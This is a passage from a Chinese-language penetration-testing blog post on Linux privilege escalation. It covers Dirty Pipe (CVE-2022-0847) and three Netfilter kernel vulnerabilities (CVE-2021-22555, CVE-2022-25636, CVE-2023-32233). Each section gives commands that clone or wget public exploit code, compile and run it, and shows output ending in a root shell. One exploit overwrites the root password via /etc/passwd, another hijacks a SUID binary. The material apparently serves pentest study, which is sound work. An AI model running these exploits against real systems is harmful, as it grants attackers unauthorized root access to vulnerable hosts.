<h2 id="Dirty-Pipe"><a href="#Dirty-Pipe" class="headerlink" title="Dirty Pipe"></a>Dirty Pipe</h2><p><a target="_blank" rel="noopener" href="https://dirtypipe.cm4all.com/">Dirty Pipe</a> ( <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847">CVE-2022-0847</a> ) 漏洞允许未经授权写入 Linux 上的 root 用户文件。从版本<code>5.8</code>到<code>5.17</code>的所有内核都受到影响，并且容易受到此漏洞的影响。</p>
<p>简单来说，只要用户有读取文件的权限，此漏洞便可让用户写入任意文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git</span><br><span class="line">$ cd CVE-2022-0847-DirtyPipe-Exploits</span><br><span class="line">$ ./compile.sh</span><br></pre></td></tr></table></figure>

<p>第一个漏洞利用版本（<code>exploit-1</code>）修改了<code>/etc/passwd</code>并为提供了具有 root 权限的提示。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ./exploit-1</span><br><span class="line"></span><br><span class="line">Backing up /etc/passwd to /tmp/passwd.bak ...</span><br><span class="line">Setting root password to &quot;piped&quot;...</span><br><span class="line">Password: Restoring /etc/passwd from /tmp/passwd.bak...</span><br><span class="line">Done! Popping shell... (run commands now)</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<p>第二个漏洞脚本（<code>exploit-2</code>），可以以 root 权限执行 SUID 二进制文件。在执行此操作之前，首先需要找到这些 SUID 二进制文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ find / -perm -4000 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">...SNPI...</span><br></pre></td></tr></table></figure>

<p>exploit-2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ./exploit-2 /usr/bin/sudo</span><br><span class="line"></span><br><span class="line">[+] hijacking suid binary..</span><br><span class="line">[+] dropping suid shell..</span><br><span class="line">[+] restoring suid binary..</span><br><span class="line">[+] popping root shell.. (dont forget to clean up /tmp/sh ;))</span><br><span class="line"></span><br><span class="line"># id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(cry0l1t3)</span><br></pre></td></tr></table></figure>

<h2 id="Netfilter"><a href="#Netfilter" class="headerlink" title="Netfilter"></a>Netfilter</h2><p><code>Netfilter</code>是一个 Linux 内核模块，提供数据包过滤、网络地址转换和其他与防火墙相关的工具。它通过根据数据包的特征和规则操纵单个数据包来控制和调节网络流量。当接收和发送网络数据包时，它会启动其他模块（如数据包过滤器）的执行。然后，这些模块可以拦截和操纵数据包。</p>
<p>这个内核模块主要有三个功能：</p>
<ol>
<li>数据包碎片整理</li>
<li>连接跟踪</li>
<li>网络地址转换 (NAT)</li>
</ol>
<p>当模块被激活时，所有 IP 数据包都会经过 <code>Netfilter</code> 的检查，然后才会转发到自身或远程系统的目标应用程序。</p>
<h3 id="CVE-2021-22555"><a href="#CVE-2021-22555" class="headerlink" title="CVE-2021-22555"></a>CVE-2021-22555</h3><p> <a target="_blank" rel="noopener" href="https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555">CVE-2021-22555</a> 影响的内核版本：2.6 - 5.11</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c</span><br><span class="line">$ gcc -m32 -static exploit.c -o exploit</span><br><span class="line">$ ./exploit</span><br><span class="line"></span><br><span class="line">[+] Linux Privilege Escalation by theflow@ - 2021</span><br><span class="line"></span><br><span class="line">[+] STAGE 0: Initialization</span><br><span class="line">[*] Setting up namespace sandbox...</span><br><span class="line">[*] Initializing sockets and message queues...</span><br><span class="line"></span><br><span class="line">[+] STAGE 1: Memory corruption</span><br><span class="line">[*] Spraying primary messages...</span><br><span class="line">[*] Spraying secondary messages...</span><br><span class="line">[*] Creating holes in primary messages...</span><br><span class="line">[*] Triggering out-of-bounds write...</span><br><span class="line">[*] Searching for corrupted primary message...</span><br><span class="line">[+] fake_idx: fff</span><br><span class="line">[+] real_idx: fdf</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br><span class="line"></span><br><span class="line">root@ubuntu:/home/cry0l1t3# id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<h3 id="CVE-2022-25636"><a href="#CVE-2022-25636" class="headerlink" title="CVE-2022-25636"></a>CVE-2022-25636</h3><p><a target="_blank" rel="noopener" href="https://github.com/Bonfee/CVE-2022-25636">CVE-2022-25636</a> 影响 Linux 内核 5.4 到 5.6.10</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/Bonfee/CVE-2022-25636.git</span><br><span class="line">$ cd CVE-2022-25636</span><br><span class="line">$ make</span><br><span class="line">$ ./exploit</span><br><span class="line"></span><br><span class="line">[*] STEP 1: Leak child and parent net_device</span><br><span class="line">[+] parent net_device ptr: 0xffff991285dc0000</span><br><span class="line">[+] child  net_device ptr: 0xffff99128e5a9000</span><br><span class="line"></span><br><span class="line">[*] STEP 2: Spray kmalloc-192, overwrite msg_msg.security ptr and free net_device</span><br><span class="line">[+] net_device struct freed</span><br><span class="line"></span><br><span class="line">[*] STEP 3: Spray kmalloc-4k using setxattr + FUSE to realloc net_device</span><br><span class="line">[+] obtained net_device struct</span><br><span class="line"></span><br><span class="line">[*] STEP 4: Leak kaslr</span><br><span class="line">[*] kaslr leak: 0xffffffff823093c0</span><br><span class="line">[*] kaslr base: 0xffffffff80ffefa0</span><br><span class="line"></span><br><span class="line">[*] STEP 5: Release setxattrs, free net_device, and realloc it again</span><br><span class="line">[+] obtained net_device struct</span><br><span class="line"></span><br><span class="line">[*] STEP 6: rop :)</span><br><span class="line"></span><br><span class="line"># id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<h3 id="CVE-2023-32233"><a href="#CVE-2023-32233" class="headerlink" title="CVE-2023-32233"></a>CVE-2023-32233</h3><p><a target="_blank" rel="noopener" href="https://github.com/Liuk3r/CVE-2023-32233">CVE-2023-32233</a> 此漏洞利用了 Linux 内核 6.3.1 及以上版本中的 Use-After-Free 漏洞，利用了 nf_tables 中所谓的匿名集。这些 nf_tables 是处理批处理请求的临时工作区，处理完成后，这些匿名集应该被清除（Use-After-Free），因此无法再使用。由于代码错误，这些匿名集未得到正确处理，程序仍然可以访问和修改它们。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/Liuk3r/CVE-2023-32233</span><br><span class="line">$ cd CVE-2023-32233</span><br><span class="line">$ gcc -Wall -o exploit exploit.c -lmnl -lnftnl</span><br><span class="line">$ ./exploit</span><br><span class="line"></span><br><span class="line">[*] Netfilter UAF exploit</span><br><span class="line"></span><br><span class="line">Using profile:</span><br><span class="line">========</span><br><span class="line">1                   race_set_slab                   # &#123;0,1&#125;</span><br><span class="line">1572                race_set_elem_count             # k</span><br><span class="line">4000                initial_sleep                   # ms</span><br><span class="line">100                 race_lead_sleep                 # ms</span><br><span class="line">600                 race_lag_sleep                  # ms</span><br><span class="line">100                 reuse_sleep                     # ms</span><br><span class="line">39d240              free_percpu                     # hex</span><br><span class="line">2a8b900             modprobe_path                   # hex</span><br><span class="line">23700               nft_counter_destroy             # hex</span><br><span class="line">347a0               nft_counter_ops                 # hex</span><br><span class="line">a                   nft_counter_destroy_call_offset # hex</span><br><span class="line">ffffffff            nft_counter_destroy_call_mask   # hex</span><br><span class="line">e8e58948            nft_counter_destroy_call_check  # hex</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">[*] Checking for available CPUs...</span><br><span class="line">[*] sched_getaffinity() =&gt; 0 2</span><br><span class="line">[*] Reserved CPU 0 for PWN Worker</span><br><span class="line">[*] Started cpu_spinning_loop() on CPU 1</span><br><span class="line">[*] Started cpu_spinning_loop() on CPU 2</span><br><span class="line">[*] Started cpu_spinning_loop() on CPU 3</span><br><span class="line">[*] Creating &quot;/tmp/modprobe&quot;...</span><br><span class="line">[*] Creating &quot;/tmp/trigger&quot;...</span><br><span class="line">[*] Updating setgroups...</span><br><span class="line">[*] Updating uid_map...</span><br><span class="line">[*] Updating gid_map...</span><br><span class="line">[*] Signaling PWN Worker...</span><br><span class="line">[*] Waiting for PWN Worker...</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br><span class="line"></span><br><span class="line">[*] You&#x27;ve Got ROOT:-)</span><br><span class="line"></span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

	  <!--
<div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>
-->
	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2024/11/11/pentest/privesc/Windows Privilege Escalation/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/10/16/pentest/web-pentest/Command Injections/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-10-25 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/Pentest/">Pentest<span>16</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/Privesc/">Privesc<span>3</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Environment-Enumeration"><span class="toc-article-text">Environment Enumeration</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Operating-system-and-version"><span class="toc-article-text">Operating system and version</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PATH"><span class="toc-article-text">PATH</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#env"><span class="toc-article-text">env</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Kernel-version"><span class="toc-article-text">Kernel version</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#CPU-version"><span class="toc-article-text">CPU version</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Login-Shells"><span class="toc-article-text">Login Shells</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Defense"><span class="toc-article-text">Defense</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Drives-and-Shares"><span class="toc-article-text">Drives and Shares</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#lpstat"><span class="toc-article-text">lpstat</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#fstab"><span class="toc-article-text">fstab</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Route-Table"><span class="toc-article-text">Route Table</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Arp-Table"><span class="toc-article-text">Arp Table</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Users"><span class="toc-article-text">Users</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Groups"><span class="toc-article-text">Groups</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#getent"><span class="toc-article-text">getent</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#home"><span class="toc-article-text">&#x2F;home</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Mount"><span class="toc-article-text">Mount</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%B7%B2%E6%8C%82%E8%BD%BD%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-article-text">已挂载的文件</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9C%AA%E6%8C%82%E8%BD%BD%E7%9A%84%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-article-text">未挂载的文件系统</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="toc-article-text">隐藏文件</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-article-text">临时文件</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Service-Enumeration"><span class="toc-article-text">Service Enumeration</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Interface"><span class="toc-article-text">Interface</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#etc-hosts"><span class="toc-article-text">&#x2F;etc&#x2F;hosts</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Last-login"><span class="toc-article-text">Last login</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%B7%B2%E7%99%BB%E9%99%86%E7%9A%84%E7%94%A8%E6%88%B7"><span class="toc-article-text">已登陆的用户</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Bash-history"><span class="toc-article-text">Bash history</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Cron-jobs"><span class="toc-article-text">Cron jobs</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Proc"><span class="toc-article-text">Proc</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%B7%B2%E5%AE%89%E8%A3%85%E7%9A%84%E5%8C%85"><span class="toc-article-text">已安装的包</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#sudo"><span class="toc-article-text">sudo</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6"><span class="toc-article-text">二进制文件</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%B7%9F%E8%B8%AA%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-article-text">跟踪系统调用</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6"><span class="toc-article-text">查找文件</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-article-text">配置文件</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%84%9A%E6%9C%AC%E6%96%87%E4%BB%B6"><span class="toc-article-text">脚本文件</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#PATH-Abuse"><span class="toc-article-text">PATH Abuse</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Special-Permissions"><span class="toc-article-text">Special Permissions</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#SUID"><span class="toc-article-text">SUID</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#SGID"><span class="toc-article-text">SGID</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Sudo-Abuse"><span class="toc-article-text">Sudo Abuse</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Privileged-Groups"><span class="toc-article-text">Privileged Groups</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#LXC-LXD"><span class="toc-article-text">LXC &#x2F; LXD</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Docker"><span class="toc-article-text">Docker</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Disk"><span class="toc-article-text">Disk</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ADM"><span class="toc-article-text">ADM</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Capabilities"><span class="toc-article-text">Capabilities</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#enumeration"><span class="toc-article-text">enumeration</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#exploit"><span class="toc-article-text">exploit</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Cron-Job-Abuse"><span class="toc-article-text">Cron Job Abuse</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Container"><span class="toc-article-text">Container</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#LXD"><span class="toc-article-text">LXD</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Docker-1"><span class="toc-article-text">Docker</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Docker-%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95"><span class="toc-article-text">Docker 共享目录</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Docker-%E5%A5%97%E6%8E%A5%E5%AD%97"><span class="toc-article-text">Docker 套接字</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Logrotate"><span class="toc-article-text">Logrotate</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Miscellaneous-Techniques"><span class="toc-article-text">Miscellaneous Techniques</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%A2%AB%E5%8A%A8%E6%B5%81%E9%87%8F%E6%8D%95%E8%8E%B7"><span class="toc-article-text">被动流量捕获</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%BC%B1-NFS-%E6%9D%83%E9%99%90"><span class="toc-article-text">弱 NFS 权限</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Hijacking-Tmux-Session"><span class="toc-article-text">Hijacking Tmux Session</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Kernel-Exploits"><span class="toc-article-text">Kernel Exploits</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Shared-Libraries"><span class="toc-article-text">Shared Libraries</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Shared-Object-Hijacking"><span class="toc-article-text">Shared Object Hijacking</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Python-Library-Hijacking"><span class="toc-article-text">Python Library Hijacking</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%94%99%E8%AF%AF%E7%9A%84%E5%86%99%E5%85%A5%E6%9D%83%E9%99%90"><span class="toc-article-text">错误的写入权限</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Library-Path"><span class="toc-article-text">Library Path</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Vulnerabilities"><span class="toc-article-text">Vulnerabilities</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Sudo"><span class="toc-article-text">Sudo</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CVE-2021-3156"><span class="toc-article-text">CVE-2021-3156</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Sudo-Policy-Bypass"><span class="toc-article-text">Sudo Policy Bypass</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Polkit"><span class="toc-article-text">Polkit</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Dirty-Pipe"><span class="toc-article-text">Dirty Pipe</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Netfilter"><span class="toc-article-text">Netfilter</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CVE-2021-22555"><span class="toc-article-text">CVE-2021-22555</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CVE-2022-25636"><span class="toc-article-text">CVE-2022-25636</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CVE-2023-32233"><span class="toc-article-text">CVE-2023-32233</span></a></li></ol></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 n2ryx's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
